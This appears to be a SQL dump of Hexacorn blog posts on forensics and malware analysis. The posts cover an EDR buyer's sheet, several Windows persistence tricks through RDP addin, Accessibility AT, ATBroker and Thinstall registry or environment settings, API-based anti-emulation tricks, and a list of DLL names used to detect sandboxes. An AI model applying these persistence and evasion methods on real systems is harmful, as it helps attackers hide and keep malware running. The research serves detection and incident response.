(PE file can be retrieved)\n\n\n\nSilent/heuristic AV detections\n\n\n\nA download of a PE file (HTTP PE Download):\n\n\r\n\nThere are also file metadata submissions with forensically interesting bits in a form of XML-like report:\n<Report \r\n Type=\"File Vote Report\" \r\n Count=\"#NUM OF FILES#\">\r\n <File \r\n  Index=\"#INDEX#\" \r\n  Active_timestamp=\"#EPOCH#\" \r\n  File_MD5=\"#MD5#\" \r\n  File_SHA256=\"#SHA256#\" \r\n  FileName=\"#FILENAME#\" \r\n  Path=\"#PATH#\" \r\n  Signature=\"#SIG#\" \r\n  Issuer=\"#ISSUER#\" \r\n  Version=\"#VERSION#\" \r\n  File_Type=\"#FILETYPE#\" \r\n  AVE_Blob=\"#AVEBLOB#\"/>\nThe Epoch, file path, file name, and hashes can support investigation in many ways. I believe there is a lot to explore here + in similar files from other vendors (if such files exist).\nIf you have ccSubSdk files available and want to share them with me for research, I’d appreciate it.\nComing back to DeXRAY – the full list of supported or recognized file formats is listed below:\n\nAhnLab (V3B)\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nAvira (QUA)\nBaidu (QV)\nBitDefender (BDQ)\nCMC Antivirus (CMC)\nComodo <GUID> (not really; Quarantined files are not encrypted  )\nESafe (VIR)\nESET (NQF)\nF-Prot (TMP) (Magic@0=’KSS’)\nKaspersky (KLQ)\nLavasoft AdAware (BDQ) /BitDefender files really/\nMalwareBytes Data files (DATA)\nMalwareBytes Quarantine files (QUAR)\nMcAfee Quarantine files (BUP)\nMicrosoft Forefront|Defender (Magic@0=0B AD|D3 45) – D3 45 C5 99 header handled\nPanda <GUID> Zip files\nSpybot – Search & Destroy 2 ‘recovery’\nSUPERAntiSpyware (SDB)\nSymantec ccSubSdk files: {GUID} files and submissions.idx\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN)\nSymantec Quarantine Index files (QBI)\nTrendMicro (Magic@0=A9 AC BD A7 which is ‘VSBX’ string ^ 0xFF)\nQuickHeal <hash> files\nVipre (<GUID>_ENC2)\nAny binary file (using X-RAY scanning)\n\nThanks to Brian for raising the interesting challenge and patiently listening to my questions and comments \nThe latest version of DeXRAY can be found here.\nShare this :)', 'Batch Analysis, Compromise Detection, DeXRAY, File Formats ZOO, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2016/09/15/dexray-1-6-ccsubsdk-files/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (149, 'Permanent Link to Beyond good ol’ Run key, Part 45', 'Hexacorn', 'August 26, 2016 ', 'RDP was a feature guest in the last two parts of the series. Time for the third visit as there is still something to write about…\nUsing dedicated addins one can change the behavior of RDP session by leveraging a mechanism that Microsoft calls Virtual Channels.\nQuoting directly from the web site:\nVirtual channels are software extensions that can be used to add functional enhancements to a Remote Desktop Services application. Examples of functional enhancements might include: support for special types of hardware, audio, or other additions to the core functionality provided by the Remote Desktop Services Remote Desktop Protocol (RDP). The RDP protocol provides multiplexed management of multiple virtual channels.\nThe mechanism is implemented using DLLs, and since it is a legitimate feature its implementation and persistence mechanism are very well documented on the web site.\nWhile the web site describes the HKCU keys only:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\\Addins\nHKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\connection\\Addins\n\nthe HKLM works as well (at least for the Default; I have not tested the connection ones cuz it’s Friday  ).\nf.ex.:\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Terminal Server Client\\Default\\Addins\\Malware\nName  = c:\\test\\test.dll\n\n\nUnlike the ClxDllPath Path presented in part 44, the Addins DLLs are loaded not immediately after mstsc.exe is launched:\n\nbut only after the actual connection with the remote system is established:\nNote: If you want to test it, make sure that the DLL you want to load matches the mstsc.exe architecture (32- or 64-bit)\n \nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2016/08/26/beyond-good-ol-run-key-part-45/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (150, 'Permanent Link to Beyond good ol’ Run key, Part 44', 'Hexacorn', 'August 19, 2016 ', 'In my previous post I described a persistence mechanism that is triggered when someone is connecting to the infected system via RDP.\nThis is an interesting way to stay alive, but it would be probably much better if we could apply the same logic not to the server, but to the client.\nThat is – launch a DLL of our choice anytime someone tries to use mstsc.exe…\nImpossible?\nNot really.\nDid I mention testing?\nYet another artifact that seems to be testing-related is this:\n\nHKLM\\SOFTWARE\\Microsoft\\Terminal Server Client\nClxDllPath=<path to DLL>\n\nYup.\nAdding this to the Windows 10 Registry:\n\nwill give us the following result:\nThe c:\\test\\test_client.dll is loaded anytime we start mstsc.exe.\nWe don’t even need to connect to the real system. Just launching mstsc.exe is enough,\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2016/08/19/beyond-good-ol-run-key-part-44/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (151, 'Permanent Link to Updated EDR sheet', 'Hexacorn', 'August 12, 2016 ', 'I have received tones of emails and am finally catching up. Thank you to everyone who provided the feedback and especially those of you who took an effort and time to make it as constructive as possible, I really really appreciate it!\nI have updated and merged all the comments I came across. If you find anything missing or wrong, just please let me know and I’ll fix it. A typical turnaround is one week. If I missed your comments, I apologize in advance – hard to keep up with the mail goodness I am receiving  Thank you for your understanding!\nLast, but not least – if you do happen to whine about the quality of this sheet, notice that this is a collaborative effort – let me know what’s wrong and I’ll fix it. Saying that’s it’s a piece of crap (yup, received blunt comments like this too  ) is okay as long as you explain why…\nI promise I will put the next version of this sheet on Google Sheet – please bear with me.\nThe latest EDR sheet can be found here.\nShare this :)', 'EDR', 'http://www.hexacorn.com/blog/2016/08/12/updated-edr-sheet/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (152, 'Permanent Link to EDR sheet, explained', 'Hexacorn', 'August 7, 2016 ', 'In my last post I published the EDR sheet; it generated quite a good response and I have received a lot of emails and some comments on Twitter which I was not able to answer today, but will follow-up on them soon.\nIt turns out that the sheet is actually useful to many people – and to my personal satisfaction the very common ‘thank you’ focuses on two aspects:\n\ngreat collaboration\ngood list of questions to ask vendors\n\nIf you look at the sheet, the columns represent features that are a ‘must-ask’ category for any EDR solution. If you do IR, forensics, or even asset inventory using the EDR tool, many answers to these questions can often get swept under the carpet, but the reality is that they are actually the most important answers to cover. You want a tool that simply works and has the richest set of features.\nHere’s a more detailed explanation of the columns:\n\nIntercept Host Events – this is a difference between being able to detect suspicious activity on the spot (just in time) vs. post-mortem; if you intercept Windows API or system services and appropriate rules correlate data retrieved from these intercepted events as-they-happen you hold in hand a key to a very efficient threat hunting & detecting badness the moment it occurs; on the other hand, if the tool only offers post-mortem inspection, this is your good old forensics model at work; not good enough for today’s world\nVolatile Data Snapshots (VDS) – while good old forensics may not be necessarily needed all the time, light forensics is very very welcome; and this includes gathering volatile data from the systems suspected to be in trouble; ability to pull this data quickly pretty much solves 99% of the IR tickets (commodity malware, PUA/PUP, near-miss type of events, etc.)\nVDS based on Physical RAM analysis – the way you collect Volatile Data Snapshots is important; if you do it via Windows APIs, or even NT APIs it is always possible to subvert their results with hooking; if the solution takes a physical memory dump and then parses it (same as volatility, rekall, redline do), you are in for a really powerful IR solution – one that can detect the most sneaky malware today no matter how hidden\nPhysical Mem Dump acquisition – related to the previous point; if the solution can acquire a physical memory dump this is a big YES\n$MFT dump acquisition or metadata extract – Same as physical memory, the ability to extract data about the file system directly from $MFT on NTFS systems is a big YES as well; it bypasses rootkits, ACLs, and also explores deleted and orphaned $MFT entries + potentially other hidden stuff (alternate data streams, extended attributes); the support for other file systems supported natively is very desired as well\nFull Packet capture – pretty much self-explanatory; if the EDR can capture full packets which you then can analyze this is a big win; it’s very expensive though (storage-wise), so if this is a functionality than can be enabled on-demand it’s even better\nKernel Mode coverage – events happening on the system can be monitored on different levels; if the EDR intercepts these events on the kernel mode level (a bit of a simplification here by avoiding the topic of hypervisors, and VDIs), this is a big win; can help to detect dodgy kernel drivers, user-mode evasions, and other nasty stuff (OS file modification/replacement, MBR writing, writing of ADS and extended attributes, etc.)\nSupports Sweeps (IOCs) – sweeps come handy if you want to look for very specific artifacts across the whole company; a file name, a process name, a Registry key/value, etc.; if the tool can do it with a few clicks, then it’s a big asset for the investigators; this particular column focuses on sweeps done by the vendor on regular basis f.ex. looking for web shells, APT, ransomware, etc.\nSupports Custom Sweeps (IOCs) – as the above, except it allows you to define your own IOCs and also run them on regular basis\nSupports queries – the EDR tool is mainly focused on IR, but it has a one, great feature which is a bit hidden – it’s a very good asset inventory + if properly supported, offers the best way to find programs, files, processes on them quickly; while IOCs are quite painful to develop (who likes XML), querying is intuitive and is similar to ‘googling around’:\n\nshow me all systems that have a process named ‘foo.exe’ currently running\nshow me all laptops that do not have the proxy client running\nshow me all systems where registry key/value for the policy XYZ has been changed to downgrade the security posture of the workstation\nshow me all users running torrent clients\netc.\n\n\nSupports more complex queries – some tools offer queries focused on forensic primitives (process exists or not, file exists or not, etc.); others, support a bit more advanced logic f.ex. allow to cross-reference events – this comes very handy if there is a parent-child relationship between the events; something that immediately comes to mind is process spawning another process; ability to query for stuff like this is a big YES for any threat hunter\nDoes it send alerts? – I personally hate dashboards; they are hiding too many details, and we do need these gore details. if you want to act on something you need tickets with all the possible information in it; if the EDR can alert you on some ‘funny’ stuff going on, then you have a new efficient event provider for your IR ticketing system\nIR capabilities when endpoint off premises – in the ideal world, everyone is connected all the time. in reality, people travel, use VPN (or not), go for holidays, their laptops get stolen, etc. etc. – the EDR tool should somehow take it into account and at least provide ‘Plan B’ capabilities; f.ex. it could take regular snapshots of volatile data which could be then stored on the EDR server; any attempt to analyze the offline system would redirect queries to that latest snapshot; not ideal, but better than nothing; it could also alert the IR staff when the system goes online again, or perhaps even let the user know (via SMS, or a voice message) that s/he should connect the system back to the network and contact IR team\nInsider Threat Detection – there is always someone in a large company doing something ‘funny’; sending credit card data home, sending clients info home, sending proprietary code home, using external storage sites, and so on and so forth… if the EDR can somehow target suspicious activities of such individuals then it’s yet another win\nSupports Asset Inventory – this is pretty much a built-in feature of any EDR; it’s just sometimes not very well exposed; having an EXPORT functionality at last for all the monitored devices + include their real status (agent installed, actually working, etc.) is going to help the IR team a lot\nHistorical data (f.ex. snapshots) – ability to compare snapshots of the same system taken at a different time (f.ex. every 24h) is a blessing; it could become a really BIG contributor to any threat hunting activities – imagine looking at diffs of the system, applying some regexes and discovering new suspicious files added to the system on daily basis; lots of potential here\nForensically sound? – if the EDR agent affects the investigated system, it contaminates it; for typical IR gigs it’s not a biggie, but if you need to run a full-blown investigation it could matter (especially if case is taken to court); the less intrusive the solution, the better; of course, practicalities often dictate what trade-offs are made; f.ex. if the memory dump is acquired, it’s hard to transfer it off the system; it’s too slow and too expensive; hence, many solutions acquire the memory dump locally (evidence contamination equivalent to a size of physical memory dump f.ex. if the system is 32G RAM, then file system gets contaminates with this large file!)\nSelf-Protection – EDR – same as AV- means nothing if it can be disabled, or bypassed; if the tool prevents regular users to mess around with it that’s already a win; if the protection is enhanced to prevent more advanced tricks (delete on reboot, add exclusions, etc.) – even better\nRemediation capabilities f.ex. isolation, live console – this is just one column, but a very loaded question really… what can you do using the tool to remediate the system; can you take it offline? can you kill, or suspend a process? Can you remove the Registry key/value? Can you bypass watchdog threads re-creating malicious artifacts? etc.\n\nThe rest of the columns are feed-, plugin, and API- oriented. I will come back to them in another post.\nAs a side note, I will most likely transfer the sheet to Google Sheets – a number of people suggested it.\nShare this :)', 'EDR', 'http://www.hexacorn.com/blog/2016/08/07/edr-sheet-explained/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (153, 'Permanent Link to Endpoint Detection and Response (EDR) solutions sheet', 'Hexacorn', 'August 6, 2016 ', 'With a growing number of EDR solutions on the market I found it a bit difficult to ‘navigate’ it beyond the typical Sales pitch. There is already a lot of body of work in this area done by Gartner’s Anton Chuvakin, but I wanted something that is speaking my language, is free to download, and is as technical as possible (from the IR/forensics perspective) so the choices we make can be a bit more educated.\nAs a result I created a spreadsheet which – with the help of many practitioners and researchers who contributed the crowd-sourced knowledge – emerged as a quite a comprehensive list of current EDR solutions on the market. This data is placed on my web site just for the convenience, but it’s in public domain. I don’t claim any copyright – I came up with the idea, but the data and comments come from a significant number of researchers and vendors who diligently shared their knowledge and concerns with me. I just put it together.\nThis is is a good moment to reflect on this. The actual users of the solutions shared data for the benefit of us all! What a great participation and sharing! And as a result (being mind blown by a number of emails I received over last couple of months) I want to extend thanks to whoever helped to make this project possible.\nYou know who you are. You are awesome. Thank you!\nThe latest EDR sheet can be found here.\nAs usual, if you find anything wrong/needing some amendment, please do let me know. I’ll fix it.\nShare this :)', 'EDR', 'http://www.hexacorn.com/blog/2016/08/06/endpoint-detection-and-response-edr-solutions-sheet/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (154, 'Permanent Link to Returning the call – ‘moshi moshi’, the API way (a.k.a. API cold calling)', 'Hexacorn', 'July 31, 2016 ', 'Software development is quite easy today. There is no longer a need to write your own libraries for everything (a mouse handler, a proprietary database, a graphics library, or your own search and caching algorithms, etc.). What’s more, a very complex functionality can be now delivered with just a few lines of script.\nYup. We are indeed very lucky.\nWhile we depend on these modules to do the hard work we happily focus on the business logic and simply getting things done. But yes, of course, this privilege relies heavily on a tremendous work of other programmers who developed and tested modules which we use every day. Modules that are the foundation of Windows as we see it today have been written over a few decades (maybe with the exception of telemetry modules ;)) and it’s not a surprise that many of them contain legacy code, vulnerabilities, and… dummy, retired, or unfinished code.\nIn this post I will focus on the latter – the APIs that are pretty much doing nothing, but returning an error or a predictable constant value (I will talk about 32-bit Windows, but same applies to 64-bit version). Either indicating that the function is not implemented yet, or is just a dummy function kept for compatibility reasons, or perhaps for some other reason. I won’t cover all of them, but will show a few examples of how these could be used.\n\nProbably the best known function that returns a constant value is kernel32.dll!GetCurrentProcess. It simply returns -1 (0xFFFFFFFF on win32). For this reason many programmers hard-code this value in their programs (one API call less).\nIts close cousin, kernel32.dll!GetCurrentThread always returns -2. Same, some coders hard-code it to avoid superfluous API calls.\ncrypt32.dll!DbgPrintf always returns 0. So does imm32.dll!CtfImmIsTextFrameServiceDisabled. And tones of other APIs. A nice ‘obfuscated’ replacement for the worn out ‘xor eax, eax’.\ngdi32.dll!GdiSupportsFontChangeEvent always returns 1. So does kernel32.dll!LZStart. And again, lots of other APIs.\nGdiPlus.dll!GdipCreateStreamOnFile aways returns 6.\nrasman.dll!RasRpcUnloadDll always returns 50.\natl.dll!AtlGetVersion returns 768 on Win10..\nMany unimplemented APIs return ERROR_INVALID_PARAMETER which is equal to 87 f.ex. dnsapi.dll!DnsUpdate and dnsapi.dll!Dns_UpdateLibEx.\n\nThis can be obviously extended to COM and its methods that do nothing, but returning ‘not implemented’ constants.\nThe other variants of this technique can utilize fully implemented APIs which are called with incorrect arguments producing a predictable last error value.\nThere are a number of potential tricks we can pull using APIs returning predictable, or very specific values, or behaving in a predictable way:\n\nanti-emulation tricks\n\ninitialization of register values – if an emulator fails to emulate the function it may not get the proper value into the eax register and as such a code dependent on it may fail (f.ex. a decryption routine, a routine using the return value as an index to a lookup table, etc.)\npassing data by storing it inside the internal OS structures f.ex. SetLastError/ SetLastErrorEx  / GetLastError combo\n\n\ndetecting the version of OS\n\nhistorically, some APIs changed the behavior and newer versions may simply return a constant f.ex. TRUE (1); a simple example is GdiSetAttrs (probably not very practical example as its behavior changed long time ago, but always…)\nnew APIs can help to detect OS version w/o using ‘traditional’ APIs (f.ex. Get Version, etc.) – relatively new ole32.dll’s CoBuildVersion function could be used to determine the version of ole32.dll (and indirectly, OS version); same goes for UrlMkBuildVersion exported by urlmon.dll\n\n\nanti-debugging tricks\n\nif the function does nothing, but calling DebugBreak (int 3), it may fool some analysts by triggering the exception handler w/o them noticing it (lame, but always)\n\n\nperhaps others…\n\nShare this :)', 'Anti-*, Malware Analysis, Reversing', 'http://www.hexacorn.com/blog/2016/07/31/returning-the-call-moshi-moshi-the-api-way-a-k-a-api-cold-calling/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (155, 'Permanent Link to Beyond good ol’ Run key, Part 43', 'Hexacorn', 'July 28, 2016 ', 'Testing, testing, testing… such an important part of the software development cycle. So important that its components are often referenced in the release code.\nThe testing functionality in Microsoft products is nothing new. I wrote about it here, and here. And today I will write about yet another component which appears to be testing-related and… can be abused to achieve persistence. This time, on Windows 10 only (have not tested servers).\nWhen Windows 10 accepts the remote desktop session, it queries the following Registry key:\n\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\\nTerminal Server\\AddIns\\TestDVCPlugin\n\nIf such key exists, the OS will attempt to read the Path value underneath.\nOnce the Path is read, the DLL that it points to will be loaded via LoadLibrary.\nAnd that’s it! We now have yet another persistent mechanism to load the DLL. Anytime the first remote desktop session is established…\nAn example of the potential malicious Registry Entry is shown below:\n\nIn a test scenario, I created a DLL that – when loaded – creates a c:\\test\\test_attached file.\nThe following screenshot shows what happens:\n\nThe user is logged on (console session) – the two first commands show situation at that moment and no presence of the file created by the DLL\nThe user then logs on remotely (under the same account – rdp-tcp#1 session).\nThe moment user logs on, the c:\\test\\test_attached file is created – the code is loaded\n\n\nThe c:\\test\\test.dll is loaded into svchost.exe process and stays resident (until reboot/service restart)\n\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response,', 'http://www.hexacorn.com/blog/2016/07/28/beyond-good-ol-run-key-part-43/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (156, 'Permanent Link to Beyond good ol’ Run key, Part 42', 'Hexacorn', 'July 22, 2016 ', 'The Ease of Access is a place where a computer user can enable the so-called Assistive Technologies (AT). These technologies make life easier for the users with needs and include OSK (On-Screen Keyboard,) Narrator, Magnifier, and a number of other options that are helping to make the work environment better.\n\nPersistence #1\nWith Windows 8 Microsoft introduced a way to register third-party Assistive Technology applications on the system. All of them are stored inside the Registry under the following branch:\n\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\n\n\nThe same branch exists on Windows 7, but the registration is possible only on Windows 8+.\nInterestingly, a user can decide to launch the ATs during the log on process. To do so, the following Registry value needs to be created/modified:\n\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\Configuration = …\n\nwhere Configuration is a comma-delimited string list of ATs the user wants to load during the logon process.\nAs a result, one can achieve persistence by registering the new AT:\n\nand ensuring the Configuration value points to it:\n\nOnce these are added the c:\\test\\malware.exe will be launched anytime the user logs on. And as a bonus, it will also run anytime the desktops switch (f.ex. when UAC pops up). The desktops-switch activity is depending on the TerminateOnDesktopSwitch value which you can read about in the linked article.\nObviously, elevated privileges are required to register the new AT.\nPersistence #2\nThe obvious modification of the technique above could rely on modification of the existing AT entry and changing the executable path of f.ex. Narrator or OSK.\nSort-of-Persistence #1\nIf you look at how system launches the ATs you will notice that the process responsible for this task is called (not surprisingly) Windows Assistive Technology Manager and is launched from the AtBroker.exe file:\n\nThe AtBroker starts the ATs using the following syntax:\n\n\nC:\\Windows\\System32\\ATBroker.exe /start <AT name>\n\n\nf.ex.:\n\n\nC:\\Windows\\System32\\ATBroker.exe /start malware\n\n\n\nOne could add this command line to any of the typical Startup locations (f.ex. Run key) which – on the surface at least – would appear as if pointing to a legitimate, signed OS binary. Most of security products or analysts looking at such entry would assume it’s a legitimate, clean binary, and unless they understand the context and the connection/relationship with the AT Registry entries they would most likely ignore it (I didn’t test any security product though).\nThere is another aspect of launching malware this way – AtBroker is spawn by winlogon.exe so if the malware was executed via AtBroker proxy, the process parent wouldn’t point to Explorer which is a parent process to most processes launched manually via GUI. This could give an impression that the malware is a process spawn not by the user, but some system component (which is actually true).  As a result someone reviewing process tree could mistakenly assume it’s legitimate.\nSort-of-Persistence #2\nAs a side note – the interface of the Easy Access applet in Control Panel (or via Win+U) can be modified using the settings described in the article I linked to.  I have not explored it. Also, the applet itself could be leveraged as a ‘hidden’ persistence mechanism that would activate only when the user launched any of the available ATs manually (either registered, or modified to point to malware). Even if I am not using any of the ATs I do occasionally launch a Magnifier, or OSK. Such user-dependent persistence mechanism could be a ‘last resort’ persistence mechanism used to re-introduce malware on the system somewhere in the future.\nAs mentioned earlier, elevated privileges are required for all this, but this is not impossible – Escalation Of Privileges is not that hard to achieve as many exploits show.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Incident Response, Malware Analysis', 'http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (157, 'Permanent Link to PEFix – simple PE file re-aligner', 'Hexacorn', 'July 9, 2016 ', 'Every time you dump a PE file from memory its dump is aligned on the memory page size boundary (4096) instead of a typical file alignment boundary which is 512 (except for some PE tricks and less common file alignments).\nThere are many really cool tools that rebuild PE files directly from memory and do it in an excellent way, but sometimes it’s good to have a simple, stupid script at hand that does the re-alignment only. The re-aligned file can’t be executed, but will make more sense when you load them into IDA. And such stupid script comes handy when images are loaded using manual/reflective loading, and there is more of them in the same process space (or you just have lots of them); rebuilding such memory dumps manually is a pain, so the script that I am attaching to this post will just do this dirty job for you (you can run it as a batch job).\nSo, say you locate a memory dump where malware hides its PE file, you then dump it f.ex. using Process Hacker, hiperdrop, or any memdumping tool, and then you can run pefix.pl over it (or them) and you should get a ‘.fixed’ file (or files) that will be just a realigned version(s) of your memory dump(s).\nLoad it into IDA, happy analysis…\nIn case malware wipes out the MZ/PE markers you can always mod the script a bit to bypass it and still rebuild the file. For completely wiped out MZ/PE markers/header/section table/etc. it’s going to be a manual job although one could think of some heuristics… who knows.. maybe in the next version :).\nThis is the script.\nShare this :)', 'Malware Analysis, PEFix, Software Releases', 'http://www.hexacorn.com/blog/2016/07/09/pefix-simple-pe-file-re-aligner/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (158, 'Permanent Link to Beyond good ol’ Run key, Part 41', 'Hexacorn', 'July 8, 2016 ', 'Thinstall apps are portable and can be quite handy. They leverage an engine that virtualizes the environment in a way that makes it possible for these awful, bloated apps to be loaded from a single executable.\nIt’s a cute idea, but the way it is implemented… could be abused for malicious purposes.\nAnd that’s why I am talking about it today \nIn the past I talked about abusing perl2exe programs that can act as a launcher for a malicious code. The idea of leveraging Thinstall programs for persistence is similarly crazy and remote and… yeah, desperate really, but hey… the possibilities are out there, so should be investigated.\nRight?\nTo my surprise, the Thinstall apps don’t seem to be very well researched. When I ran the example app through my analysis tool, I noticed that many environment variables are being used f.ex.:\n\n<name of the thinstal app>_SANDBOX_DIR\nTHINSTALL_BIN\nTHINSTALL_CACHE_DIR\nTHINSTALL_SANDBOX_DIR\nTHNOCMDLN\nTS_CMDLINE\nTS_CWD\nTS_DESKTOP\nTS_LOGGING_ENABLED\nTS_MODN\n\nTS_MOD0\nTS_MOD1\n…\nTS_MODN\n\n\nTS_OPTIONS\nTS_ORIGIN\nTS_ORIGSHOWWINDOWVALUE\nTS_SBCLEANUP\nTS_SBCLEANUP_CONTINUE\nTS_SOURCE\nTS_SUBPROC\nTS_UPDATE_N\n\nTS_UPDATE_0\nTS_UPDATE_1\n…\nTS_UPDATE_N\n\n\nTS_UPDATE_THINREG\nTS_UPDATE_CMDLINE\nTS_USER_SID\n\nMy immediate guess was that some of them could be potentially leveraged to modify the behaviour of the Thinstalled app. While googling for some of them, I could not find too many references – this is the only one that is the most accurate (in Russian) that I could find. The post lists additional 3 environment variables:\n\nTS_DEBUGGED\nTS_EXECUTE_EXTERNAL\nTS_SVCINIT\n\nThis made me poke around more – dumping the memory of the thinstalled app process and running strings/grep over it surely reveals even more TS_ environment variables:\n\nTS__ST\nTS_LOG_FILENAME\nTS_SKIP_APPSYNC\nTS_TOKEN_INTEGRITY_LEVEL\nTS_WAITINIT\n\nThis is actually plenty of stuff to research on a rainy day, so for now I will just focus on the persistence mechanisms.\nHere are three quick wins in this space:\nPersistence mechanism number 1\nLooking at the TS_ environment variables we can see that there are two potential candidates for an immediate abuse:\n\nTS_UPDATE_N\nTS_UPDATE_CMDLINE\n\nAfter toying around with it for a bit, I quickly came up with the following combo:\n\nset TS_UPDATE_0=1\nset TS_UPDATE_CMDLINE=c:\\windows\\system32\\notepad.exe\n\nSure enough, when you set up these environment variables, notepad will be launched from the Thinstall app anytime it starts (this could potentially lead to an escalation of privileges as well).\nOf course, to be a real persistent mechanism these environment variables have to be permanently set via Registry (f.ex. HKEY_CURRENT_USER\\Environment key).\nNote: this persistence mechanism breaks the Thinstall app (the original app doesn’t launch; the update mechanism seems to require a restart of the application so this needs to be done by the program referenced by TS_UPDATE_CMDLINE; it’s a bit like a companion virus)\nPersistence mechanism number 2\nWhen launched, one of the first files Thinstall app tries to find is os_debug.dll – if present in the local directory it will be loaded. Hence, dropping a malicious os_debug.dll inside the same folder will ensure the DLL is loaded:\n\n \nPersistence mechanism number 3\n\nLooking at the other files the Thinstall app is looking for when it starts I discovered that it attempts to enumerate the following folder:\n\n%PROGRAM_FILES%\\ThinstallPlugins\n\nI created this directory and dropped a random DLL inside it, and sure enough, it was loaded when the Thinstall app started.\nAs I mentioned, leveraging Thinstall apps as a persistence mechanism is a very VERY desperate idea, but hey… any chance to investigate (even if superficially) a rarely seen file format is always interesting to me. And I bet there is still more to discover there… On this note, I have added the Thinstall app window class to the Certain Windows… stay classy… post.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response,', 'http://www.hexacorn.com/blog/2016/07/08/beyond-good-ol-run-key-part-41/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (159, 'Permanent Link to Enter Sandbox – part 12: The Library of naughty libraries', 'Hexacorn', 'July 1, 2016 ', 'Updated 2017-12-17\nAdded makin library ahlo.dll\nUpdated 2017-11-18\nFixed incorrectly attributed iDefense Labs libs, added some 64- bit libs and updated descriptions\nOld post\nDetecting sandboxes is a cool domain for research. It’s been a fav topic for many companies to cover for many years in their blogs and there is… no end to it.\nIn this short summary, I’ll try to list all the phantom/real DLLs that anti-sandbox tricks rely on to detect suspicious, or at least unfriendly AV environment.\nSome of them are very well known, some of them… less.\nIf you know any others, please do let me know.\nThank you!\nHere they are:\n\na2hooks32    Emsisoft 32-bit\na2hooks64    Emsisoft 64-bit\nadialhk    Kaspersky Anti-Virus\nasho    Library injected by makin\nanvirhook56    AnVir Software\napi_log    iDefense Labs\napihookdll    (Generic API Hooking DLL name)\napshook    Cognizant Application Protection Hook\navgrsstx    AVG Internet Security\navcuf32    BitDefender 32-bit\navcuf64    BitDefender 64-bit\nBgAgent    BullGuard\ncmdvrt32    Comodo 32-bit\ncmdvrt64    Comodo 64-bit\ncssdll32    Comodo (SafeSurf)\ndbghelp    Debug Help (Potentially used to detect sandboxing env)\ndesktopmessaging    Sophos Anti-Virus\ndir_watch    iDefense Labs\neeconsumer    Sophos Anti-Virus\nguard32    Comodo 32-bit\nguard64    Comodo 64-bit\nhinthk    HintSoft\niatloader    API Override\nicadapter    Sophos Anti-Virus\nicmanagement    Sophos Anti-Virus\nieprot    Rising Information Technology (IE Protector)\nkakatool    Rising Information Technology\nkloehk    Kaspersky Anti-Virus (Outlook Express Hook)\nkmon    Rising Information Technology\nlegacyconsumers    Sophos Anti-Virus\nmzvkbd    Kaspersky Anti-Virus\npavshook    Panda\nPCTGMhk    PC Tools\npersistance    Sophos Anti-Virus\npinvm    PIN (Instrumentation Framework)\nprintfhelp    Unknown Sandbox\npsapi    Possibly loaded to look for processes/modules\npstorec    Possible SunBelt Sandbox (but also other sandboxes that preload DLLs)\nQOEHook    Qurb\nR3HOOK    Kaspersky Anti-Virus (Ring 3 Hooker)\nrapport    Trusteer\nrooksbas    Trusteer\nsar1    Sophos Anti-Rootkit\nsar2    Sophos Anti-Rootkit\nsar3    Sophos Anti-Rootkit\nsar4    Sophos Anti-Rootkit\nsavneutralres    Sophos Anti-Virus\nsavreseng    Sophos Anti-Virus\nsavshellext    Sophos Anti-Virus 32-bit\nsavshellextx64    Sophos Anti-Virus 64-bit\nsbie    SandBoxie\nsbie!ll    SandBoxie\nsbiedll    SandBoxie\nsbiedllx    SandBoxie\nscaneditfacade    Sophos Anti-Virus\nscanmanagement    Sophos Anti-Virus\nsecurity    Sophos Anti-Virus\nsf2    Avast\nsipsmanagement    Sophos Anti-Virus\nsnxhk    Avast\nsophos_detoured    Sophos Anti-Virus\nsophos_detoured_x64    Sophos Anti-Virus\nsophosbho    Sophos Anti-Virus\nsophosbhox64    Sophos Anti-Virus\nsophtaineradapter    Sophos Anti-Virus\nssleay32    Trusteer (could be a legitimate use of OpenSSL library though)\nswi_filter    Sophos Anti-Virus\nswi_ifslsp    Sophos Anti-Virus\nswimanagement    Sophos Anti-Virus\nsxin    Qihoo 360\nsysteminformation    Sophos Anti-Virus\ntamperprotectionmanagement    Sophos Anti-Virus\nthreatdetection    Sophos Anti-Virus\ntranslators    Sophos Anti-Virus\nUMEngx86    Norton Sonar\nvirusdetection    Sophos Anti-Virus\nvmcheck    Virtual PC\nvmhgfs    VMWare\nwbsys    Stardock.Net 